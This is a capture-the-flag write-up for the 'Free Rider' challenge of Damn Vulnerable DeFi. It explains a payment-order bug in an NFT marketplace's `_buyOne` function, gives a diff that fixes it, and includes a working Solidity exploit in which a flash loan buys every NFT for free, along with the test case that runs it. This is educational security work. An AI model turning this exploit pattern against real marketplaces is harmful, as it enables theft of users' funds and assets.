## The `_buyOne` function has a logic error that allows any user to buy a NFT for free

The function is transfering the token from buyer to seller, then uses `token.ownerOf` expecting to get the address of the seller (because the dev things that the cached NFT contract will keep the same owner after the transfer from). But what is happening in reality, is that it is taking the address of the buyer, so it is 'refunding' the ETH.  
```solidity
    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount; 

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token 
        // @audit this is transfering ETH the NEW owner of the NFT (AKA the buyer), not the previous one (AKA the seller) 
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```


### recomended mitigations
Cache the onwer of the token before the transfer:
```diff
    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount; 

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
+       address prevOwner = _token.ownerOf(tokenId);
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token 
        // @audit this is transfering ETH the NEW owner of the NFT (AKA the buyer), not the previous one (AKA the seller) 
-       payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+       payable(prevOwner).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```

### PoC
We Request a flashloan from UniswapV2 to get 15 ETH to buy one NFT (no needed to request 15*6 ETH cause the ETH will be sended back on each buy). 
To make this we create an `Interacter` contract that has the `uniswapV2Call` callback with the logic to use the borrowed funds. Specifically, makes a call to `buyMany` and then transfer the NFTs to the recovery manager. 

Interacter:
```solidity
contract Interacter {
    address uv2Pool;
    address weth;
    address marketplace;
    address player;
    address recoveryManager;
    
    constructor(address _uv2Pool, address _weth, address _marketplace, address _player, address _recoveryManager) {
        uv2Pool = _uv2Pool;
        weth = _weth;
        marketplace = _marketplace;
        player = _player;
        recoveryManager = _recoveryManager;
    }

    function uniswapV2Call(address sender, uint amountOut0, uint amount1Out, bytes calldata data) public {
        WETH _weth = WETH(payable(weth));
        FreeRiderNFTMarketplace _marketplace = FreeRiderNFTMarketplace(payable(marketplace));
        
        _weth.withdraw(_weth.balanceOf(address(this)));


        uint256[] memory ids = new uint256[](6);
        ids[0] = 0;
        ids[1] = 1;
        ids[2] = 2;
        ids[3] = 3;
        ids[4] = 4;
        ids[5] = 5;
        
        _marketplace.buyMany{ value: 15e18 }(ids);

        DamnValuableNFT nft = _marketplace.token();
        nft.safeTransferFrom(address(this), recoveryManager, 0);
        nft.safeTransferFrom(address(this), recoveryManager, 1);
        nft.safeTransferFrom(address(this), recoveryManager, 2);
        nft.safeTransferFrom(address(this), recoveryManager, 3);
        nft.safeTransferFrom(address(this), recoveryManager, 4);
        nft.safeTransferFrom(address(this), recoveryManager, 5, abi.encode(player)); // send the address to receive the bounty 

        // Due to vul, I get my ETH back
        _weth.deposit{ value:address(this).balance }();
        _weth.transfer(uv2Pool, _weth.balanceOf(address(this)));
    }

    function onERC721Received(address,address,uint256,bytes calldata) external pure returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() payable external {}

}
```

then in the testcase:
```solidity
    function test_freeRider() public 
    checkSolvedByPlayer
    {    
       Interacter interacter = new Interacter(address(uniswapPair), address(weth), address(marketplace), player, address(recoveryManager));
       // -1 cause isSolved is evaluating this to be greater than 45e18 not greater or equal->TODO: calculate exact fees the transfer just the necessary
       weth.deposit{ value:player.balance - 1 }(); 
       weth.transfer(address(interacter), weth.balanceOf(player)); // transfer to pay the fee for the flashloan 
       // request flashloan 
       uniswapPair.swap(
        15e18,
        0,
        address(interacter),
        'non-zero-length'
       );
    }
```